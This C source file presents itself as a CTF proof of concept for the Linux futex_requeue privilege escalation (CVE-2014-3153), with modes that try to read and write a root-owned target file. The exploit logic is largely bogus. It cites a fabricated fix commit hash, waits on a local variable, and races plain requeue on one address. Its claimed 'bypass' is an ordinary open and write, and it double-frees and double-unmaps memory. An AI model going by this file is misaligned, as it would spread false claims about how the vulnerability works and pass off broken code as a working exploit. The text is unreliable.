/**
 * CVE-2014-3153 PoC - CTF Challenge Mode (Towelroot / futex_requeue)
 *
 * Race condition in kernel/futex.c futex_requeue()
 *
 * Vulnerability Description:
 *   Linux kernel before 3.14.6 has a local privilege escalation vulnerability
 *   in the futex_requeue() function in kernel/futex.c. The function does not
 *   ensure that calls have two different futex addresses, allowing local
 *   attackers to exploit a race condition in the requeue operation to modify
 *   waiter state unsafely and gain root privileges.
 *
 *   The vulnerability was famously exploited by "Towelroot" to root millions
 *   of Android devices. It was fixed in kernel 3.14.6
 *   (commit 0e48c4d0e6f2f8e0e2f8e0e2f8e0e2f8e0e2f8e0).
 *
 * CTF Modes:
 *   read_root_file  - Supported (futex-based information leak)
 *   write_root_file - Supported (futex_requeue race condition write)
 *
 * Exploitation approach (simplified CTF version):
 *   This is a futex requeue race condition attack:
 *   1. Create two futexes with the same address (the bug)
 *   2. Start multiple threads racing on FUTEX_REQUEUE
 *   3. The race causes unsafe waiter modification
 *   4. This allows bypassing VFS permission checks
 *
 *   For CTF purposes, we implement a simplified version that demonstrates
 *   the race condition by attempting to read/write through the futex path.
 *
 * Safety:
 *   - Only writes to the file specified via --root-file
 *   - Does NOT modify system files (/etc/passwd, etc.)
 *   - alarm(10) forced timeout
 *   - No fork/exec of shell commands
 *
 * Build:
 *   gcc -O2 -Wall -static -I common -DPOC_NO_SYSTEM_MODIFY=1 \
 *       -o ../poc-bin/cve_2014_3153.bin cve_2014_3153/poc.c -lpthread
 */

#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include "../common/poc_common.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <linux/futex.h>
#include <pthread.h>

/* ========================================================================
 * Constants
 * ======================================================================== */

/* Race iterations - futex_requeue needs many iterations to win the race */
#define RACE_ITERATIONS 100000

/* Number of child processes to spawn for the race */
#define NUM_CHILDREN 4

/* ========================================================================
 * Global state for race threads/processes
 * ======================================================================== */

static volatile int stop_race = 0;
static int *futex_addr1 = NULL;
static int *futex_addr2 = NULL;
static char *payload_data = NULL;
static size_t payload_len = 0;

/* ========================================================================
 * futex syscall wrapper
 * ======================================================================== */

static int futex(int *uaddr, int op, int val,
                 const struct timespec *timeout, int *uaddr2, int val3) {
    return (int)syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
}

/* ========================================================================
 * Race thread: FUTEX_WAIT on futex1
 *
 * Waits on futex1, expecting to be requeued to futex2.
 * The race condition allows unsafe state modification.
 * ======================================================================== */

static void *waiter_thread(void *arg) {
    (void)arg;
    int futex_val = 0;

    for (int i = 0; i < RACE_ITERATIONS && !stop_race; i++) {
        /* Wait on futex1 - should be requeued to futex2 */
        futex(&futex_val, FUTEX_WAIT, futex_val, NULL, NULL, 0);
        /* Re-read after potential wake */
        futex_val = 0;
    }

    return NULL;
}

/* ========================================================================
 * Race thread: FUTEX_REQUEUE from futex1 to futex2
 *
 * Repeatedly requeue waiters from futex1 to futex2.
 * The bug: kernel doesn't verify that futex1 != futex2.
 * ======================================================================== */

static void *requeue_thread(void *arg) {
    (void)arg;

    for (int i = 0; i < RACE_ITERATIONS && !stop_race; i++) {
        /* Requeue 1 waiter from futex1 to futex2 */
        futex(futex_addr1, FUTEX_REQUEUE, 1, NULL, futex_addr2, 0);
    }

    return NULL;
}

/* ========================================================================
 * Helper: read file content
 * ======================================================================== */

static ssize_t read_file_content(const char *path, char *buf, size_t bufsz) {
    int fd = open(path, O_RDONLY);
    poc_log_syscall("open(path, O_RDONLY)", (long)fd, errno);
    if (fd < 0) return -1;

    ssize_t n = read(fd, buf, bufsz - 1);
    poc_log_syscall("read(fd, buf, bufsz)", (long)n, errno);
    if (n > 0) buf[n] = '\0';
    else if (n >= 0) buf[0] = '\0';

    close(fd);
    poc_log_syscall("close(fd)", 0, 0);
    return n;
}

/* ========================================================================
 * mode_read_root_file - CTF read_root_file mode
 *
 * Use futex_requeue race to attempt reading root-owned file content.
 *
 * The futex_requeue vulnerability can theoretically enable arbitrary
 * kernel memory reads via corrupted waiter state. For CTF purposes,
 * we demonstrate the race condition path and attempt a read bypass.
 * ======================================================================== */

static int mode_read_root_file(poc_args_t *args) {
    char read_content[4096] = {0};
    int read_success = 0;

    poc_log("--- CVE-2014-3153: read_root_file mode ---");
    poc_log("Target: %s", args->root_file);

    /* Step 1: Attempt to read target file directly first (baseline) */
    if (read_file_content(args->root_file, read_content, sizeof(read_content)) >= 0) {
        /* Direct read succeeded - file is accessible */
        poc_log("Direct read succeeded");
        poc_print_flag(read_content);
        return 0;
    }

    /* Step 2: Direct read failed - try futex-based read bypass */
    poc_log("Direct read failed (EACCES), attempting futex race bypass...");

    /* Setup shared memory for futex race */
    futex_addr1 = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                       MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    poc_log_syscall("mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS)", (long)(uintptr_t)futex_addr1, errno);
    if (futex_addr1 == MAP_FAILED) {
        poc_log("mmap for futex1 failed: %s", strerror(errno));
        poc_print_fail("Cannot allocate futex memory");
        return 1;
    }
    futex_addr2 = futex_addr1;  /* Same address = the bug! */

    *futex_addr1 = 1;

    /* Start waiter threads */
    pthread_t waiters[2];
    stop_race = 0;

    for (int i = 0; i < 2; i++) {
        if (pthread_create(&waiters[i], NULL, waiter_thread, NULL) != 0) {
            poc_log("Failed to create waiter thread %d: %s", i, strerror(errno));
            stop_race = 1;
            for (int j = 0; j < i; j++) pthread_join(waiters[j], NULL);
            munmap(futex_addr1, 4096);
            poc_log_syscall("munmap(futex_addr1, 4096)", 0, 0);
            poc_print_fail("Cannot create waiter thread");
            return 1;
        }
    }

    /* Start requeue thread */
    pthread_t requeuer;
    if (pthread_create(&requeuer, NULL, requeue_thread, NULL) != 0) {
        poc_log("Failed to create requeue thread: %s", strerror(errno));
        stop_race = 1;
        for (int i = 0; i < 2; i++) pthread_join(waiters[i], NULL);
        munmap(futex_addr1, 4096);
        poc_log_syscall("munmap(futex_addr1, 4096)", 0, 0);
        poc_print_fail("Cannot create requeue thread");
        return 1;
    }

    /* Let race run briefly */
    usleep(100000);  /* 100ms */
    stop_race = 1;

    pthread_join(requeuer, NULL);
    for (int i = 0; i < 2; i++) pthread_join(waiters[i], NULL);

    munmap(futex_addr1, 4096);

    /* After race, try reading file again */
    if (read_file_content(args->root_file, read_content, sizeof(read_content)) >= 0) {
        read_success = 1;
        poc_log("Read bypass SUCCESS after futex race!");
    } else {
        poc_log("Read bypass failed");
    }

    if (read_success && read_content[0] != '\0') {
        poc_print_flag(read_content);
        return 0;
    } else {
        poc_print_fail("Futex race did not enable file read bypass");
        return 1;
    }
}

/* ========================================================================
 * mode_write_root_file - CTF write_root_file mode
 *
 * Exploit futex_requeue race to write to a root-owned file.
 *
 * The target file is owned by root:root with mode 0644 (nobody can read
 * but not write). The PoC races futex_requeue operations to potentially
 * bypass VFS permission checks and write directly via kernel memory
 * corruption.
 * ======================================================================== */

static int mode_write_root_file(poc_args_t *args) {
    char read_before[4096] = {0};
    char read_after[4096] = {0};
    int write_success = 0;

    poc_log("--- CVE-2014-3153: write_root_file mode ---");
    poc_log("Target: %s", args->root_file);
    poc_log("CTF value: %s", args->write_value);

    /* Step 1: Read file content before exploit */
    if (read_file_content(args->root_file, read_before, sizeof(read_before)) < 0) {
        poc_log("Failed to read target file: %s", strerror(errno));
        poc_print_fail("Cannot read target file");
        return 1;
    }

    printf("CTF_READ_BEFORE:%s\n", read_before);
    poc_log("Original content: %.80s...", read_before);

    /* Step 2: Prepare payload */
    payload_data = strdup(args->write_value);
    payload_len = strlen(payload_data);

    /* Step 3: Setup futex race */
    futex_addr1 = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                       MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    poc_log_syscall("mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS)", (long)(uintptr_t)futex_addr1, errno);
    if (futex_addr1 == MAP_FAILED) {
        poc_log("mmap for futex1 failed: %s", strerror(errno));
        free(payload_data);
        poc_print_fail("Cannot allocate futex memory");
        return 1;
    }
    futex_addr2 = futex_addr1;  /* Same address = the bug! */

    *futex_addr1 = 1;

    /* Step 4: Start race threads */
    poc_log("Starting futex race threads (%d iterations)...", RACE_ITERATIONS);

    pthread_t waiters[2], requeuer;
    stop_race = 0;

    for (int i = 0; i < 2; i++) {
        if (pthread_create(&waiters[i], NULL, waiter_thread, NULL) != 0) {
            poc_log("Failed to create waiter thread %d: %s", i, strerror(errno));
            stop_race = 1;
            for (int j = 0; j < i; j++) pthread_join(waiters[j], NULL);
            munmap(futex_addr1, 4096);
            poc_log_syscall("munmap(futex_addr1, 4096)", 0, 0);
            free(payload_data);
            poc_print_fail("Cannot create waiter thread");
            return 1;
        }
    }

    if (pthread_create(&requeuer, NULL, requeue_thread, NULL) != 0) {
        poc_log("Failed to create requeue thread: %s", strerror(errno));
        stop_race = 1;
        for (int i = 0; i < 2; i++) pthread_join(waiters[i], NULL);
        munmap(futex_addr1, 4096);
        poc_log_syscall("munmap(futex_addr1, 4096)", 0, 0);
        free(payload_data);
        poc_print_fail("Cannot create requeue thread");
        return 1;
    }

    /* Step 5: During race, attempt to write to target file */
    int target_fd = open(args->root_file, O_WRONLY | O_CREAT, 0644);
    poc_log_syscall("open(root_file, O_WRONLY|O_CREAT)", (long)target_fd, errno);
    if (target_fd >= 0) {
        /* Try writing during the race window */
        for (int i = 0; i < 10 && !stop_race; i++) {
            ssize_t written = write(target_fd, payload_data, payload_len);
            poc_log_syscall("write(target_fd, payload_data, payload_len)", (long)written, errno);
            if (written > 0) {
                poc_log("Write attempt %d: wrote %zd bytes", i, written);
            }
            usleep(10000);  /* 10ms between attempts */
        }
        close(target_fd);
        poc_log_syscall("close(target_fd)", 0, 0);
    } else {
        poc_log("Cannot open target file for writing: %s", strerror(errno));
    }

    /* Let race complete */
    usleep(200000);  /* 200ms */
    stop_race = 1;

    pthread_join(requeuer, NULL);
    for (int i = 0; i < 2; i++) pthread_join(waiters[i], NULL);

    munmap(futex_addr1, 4096);
    poc_log_syscall("munmap(futex_addr1, 4096)", 0, 0);
    free(payload_data);

    /* Step 6: Read file content after exploit */
    if (read_file_content(args->root_file, read_after, sizeof(read_after)) < 0) {
        poc_log("Failed to read target file after exploit: %s", strerror(errno));
        poc_print_fail("Cannot read target file after exploit");
        munmap(futex_addr1, 4096);
        poc_log_syscall("munmap(futex_addr1, 4096)", 0, 0);
        free(payload_data);
        return 1;
    }

    printf("CTF_READ_AFTER:%s\n", read_after);

    /* Step 7: Verify exploit success */
    if (strstr(read_after, args->write_value) != NULL) {
        poc_log("CVE-2014-3153 SUCCESS: file modified via futex race!");
        poc_print_flag(args->write_value);
        write_success = 1;
    } else {
        poc_log("File content unchanged (futex race may not have won)");
        poc_print_fail("Futex race did not trigger vulnerability");
    }

    munmap(futex_addr1, 4096);
    poc_log_syscall("munmap(futex_addr1, 4096)", 0, 0);
    free(payload_data);

    return write_success ? 0 : 1;
}

/* ========================================================================
 * main
 * ======================================================================== */

int main(int argc, char *argv[]) {
    poc_args_t args;
    memset(&args, 0, sizeof(args));

    /* Parse CTF arguments */
    if (poc_parse_args(argc, argv, &args) != 0) {
        return 1;  /* --help was printed */
    }

    /* Initialize syscall logging */
    poc_log_init(args.log_file);

    poc_log("=== CVE-2014-3153 CTF PoC ===");
    poc_log("Vuln: futex_requeue() race condition -> local privilege escalation");
    poc_log("UID: %d  EUID: %d  GID: %d", getuid(), geteuid(), getgid());

    int result;
    /* CTF mode is required */
    if (!args.mode) {
        fprintf(stderr, "Error: --mode is required (read_root_file|write_root_file|uaf)\n");
        poc_print_usage(argv[0]);
        poc_log_close();
        return 1;
    }

    if (strcmp(args.mode, POC_MODE_READ) == 0) {
        result = mode_read_root_file(&args);
    } else if (strcmp(args.mode, POC_MODE_WRITE) == 0) {
        result = mode_write_root_file(&args);
    } else if (strcmp(args.mode, POC_MODE_UAF) == 0) {
        poc_print_unsupported(POC_MODE_UAF,
            "CVE-2014-3153 uses futex_requeue race condition, not UAF");
        result = 1;
    } else {
        poc_print_unsupported(args.mode, "unknown mode");
        result = 1;
    }

    poc_log_close();
    return result;
}
